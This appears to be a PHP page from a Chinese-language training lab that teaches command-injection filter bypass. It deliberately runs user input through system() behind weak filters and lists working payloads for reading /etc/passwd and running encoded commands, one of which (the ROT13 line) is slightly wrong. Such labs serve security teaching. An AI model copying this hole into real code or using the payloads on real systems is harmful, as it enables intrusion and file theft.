<div class="panel fade-in">
    <div class="level-info">
        <span class="level-dot high"></span>
        <span class="badge badge-hard">困难</span>
        <h2 style="margin:0">🔄 绕过过滤挑战</h2>
    </div>

    <div class="alert alert-info">
        <strong>📖 模块说明：</strong>实战WAF绕过技术。通过选择不同的过滤规则，练习各种绕过方法。
    </div>

    <form method="POST">
        <div class="form-group">
            <label for="bypass_input">输入命令：</label>
            <div class="form-row">
                <input type="text" name="bypass_input" id="bypass_input" 
                       placeholder="输入要执行的命令..."
                       value="<?php echo htmlspecialchars($_POST['bypass_input'] ?? ''); ?>">
                <button type="submit" class="submit-btn">执行 ▶</button>
            </div>
        </div>

        <div class="form-group">
            <label>选择过滤规则（可多选）：</label>
            <div class="checkbox-group">
                <label><input type="checkbox" name="filters[]" value="space" 
                    <?php echo (!empty($_POST['filters']) && in_array('space', $_POST['filters']))?'checked':''; ?>>
                    🚫 过滤空格</label>
                <label><input type="checkbox" name="filters[]" value="semicolon" 
                    <?php echo (!empty($_POST['filters']) && in_array('semicolon', $_POST['filters']))?'checked':''; ?>>
                    🚫 过滤分号 ;</label>
                <label><input type="checkbox" name="filters[]" value="pipe" 
                    <?php echo (!empty($_POST['filters']) && in_array('pipe', $_POST['filters']))?'checked':''; ?>>
                    🚫 过滤管道 |</label>
                <label><input type="checkbox" name="filters[]" value="slash" 
                    <?php echo (!empty($_POST['filters']) && in_array('slash', $_POST['filters']))?'checked':''; ?>>
                    🚫 过滤斜杠 /</label>
                <label><input type="checkbox" name="filters[]" value="cat" 
                    <?php echo (!empty($_POST['filters']) && in_array('cat', $_POST['filters']))?'checked':''; ?>>
                    🚫 过滤命令 cat</label>
                <label><input type="checkbox" name="filters[]" value="all" 
                    <?php echo (!empty($_POST['filters']) && in_array('all', $_POST['filters']))?'checked':''; ?>>
                    🔥 终极模式（全部过滤）</label>
            </div>
        </div>
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['bypass_input'])) {
        $input = $_POST['bypass_input'];
        $filters = $_POST['filters'] ?? [];
        $filtered_input = $input;
        $filter_log = [];

        // 应用过滤规则
        if (in_array('all', $filters)) {
            $filters = ['space', 'semicolon', 'pipe', 'slash', 'cat'];
        }

        foreach ($filters as $filter) {
            switch ($filter) {
                case 'space':
                    $filtered_input = preg_replace('/\s+/', '', $filtered_input);
                    $filter_log[] = '过滤空格';
                    break;
                case 'semicolon':
                    $filtered_input = str_replace([';', '；'], '', $filtered_input);
                    $filter_log[] = '过滤分号';
                    break;
                case 'pipe':
                    $filtered_input = str_replace(['|', '｜'], '', $filtered_input);
                    $filter_log[] = '过滤管道符';
                    break;
                case 'slash':
                    $filtered_input = str_replace('/', '', $filtered_input);
                    $filter_log[] = '过滤斜杠';
                    break;
                case 'cat':
                    $filtered_input = str_ireplace('cat', '', $filtered_input);
                    $filter_log[] = '过滤命令 cat';
                    break;
            }
        }

        // 显示过滤信息
        if (!empty($filter_log)) {
            echo '<div class="alert alert-danger">';
            echo '<strong>🔒 已启用过滤：</strong>' . implode('、', $filter_log);
            echo '<br><strong>原始输入：</strong><code>' . htmlspecialchars($input) . '</code>';
            echo '<br><strong>过滤后：</strong><code>' . htmlspecialchars($filtered_input) . '</code>';
            echo '</div>';
        } else {
            echo '<div class="alert alert-success">';
            echo '<strong>✅ 未启用任何过滤</strong>';
            echo '</div>';
        }

        // 执行命令
        echo '<div class="output-section">';
        echo '<h4>执行结果：</h4>';
        echo '<div class="output-box">';
        ob_start();
        system($filtered_input . ' 2>&1', $return_var);
        $output = ob_get_clean();
        echo $output ? htmlspecialchars($output) : '<span class="info">（无输出）</span>';
        echo '</div>';
        echo '<div class="status-bar">';
        echo '<span><span class="label">返回码:</span> ' . $return_var . '</span>';
        echo '<span><span class="label">过滤规则数:</span> ' . count($filter_log) . '</span>';
        echo '</div>';
        echo '</div>';
    }
    ?>

    <div class="tip-collapse">
        <div class="tip-header" onclick="this.nextElementSibling.classList.toggle('show')">
            💡 绕过技巧大全
        </div>
        <div class="tip-content">
            <h4>🚫 空格被过滤时</h4>
            <ul class="payload-list">
                <li><code>cat${IFS}/etc/passwd</code> - 使用$IFS变量</li>
                <li><code>{cat,/etc/passwd}</code> - 使用花括号</li>
                <li><code>cat&lt;/etc/passwd</code> - 使用输入重定向</li>
                <li><code>cat$IFS$9/etc/passwd</code> - \$9分隔</li>
                <li><code>cat%09/etc/passwd</code> - 使用制表符%09</li>
            </ul>

            <h4>🚫 分号/管道被过滤时</h4>
            <ul class="payload-list">
                <li><code>127.0.0.1%0awhoami</code> - URL编码换行符</li>
                <li><code>127.0.0.1%0dwhoami</code> - 回车符</li>
                <li><code>127.0.0.1||whoami</code> - 逻辑或</li>
                <li><code>127.0.0.1&&whoami</code> - 逻辑与</li>
            </ul>

            <h4>🚫 命令名 cat 被过滤时</h4>
            <ul class="payload-list">
                <li><code>tac /etc/passwd</code> - 反向输出</li>
                <li><code>less /etc/passwd</code></li>
                <li><code>more /etc/passwd</code></li>
                <li><code>head /etc/passwd</code></li>
                <li><code>tail /etc/passwd</code></li>
                <li><code>nl /etc/passwd</code> - 带行号输出</li>
                <li><code>sed -n '1,$p' /etc/passwd</code></li>
                <li><code>awk '1' /etc/passwd</code></li>
                <li><code>c''at /etc/passwd</code> - 单引号拼接</li>
                <li><code>c""at /etc/passwd</code> - 双引号拼接</li>
                <li><code>c\at /etc/passwd</code> - 反斜杠拼接</li>
                <li><code>/???/??t /???/??????</code> - 通配符匹配 /bin/cat /etc/passwd</li>
            </ul>

            <h4>🚫 斜杠被过滤时</h4>
            <ul class="payload-list">
                <li><code>cat\${HOME:0:1}etc\${HOME:0:1}passwd</code> - 变量截取</li>
                <li><code>cd ..; cat etc/passwd</code> - 切换目录绕过</li>
                <li><code>cat $(echo ~)///////etc/passwd</code> - 多斜杠</li>
            </ul>

            <h4>🔧 编码绕过</h4>
            <ul class="payload-list">
                <li><code>echo "d2hvYW1p" | base64 -d | bash</code> - Base64编码</li>
                <li><code>$(printf "\x77\x68\x6f\x61\x6d\x69")</code> - Hex编码</li>
                <li><code>$(echo "whoami" | tr 'a-z' 'n-za-m')</code> - ROT13</li>
            </ul>
        </div>
    </div>
</div>
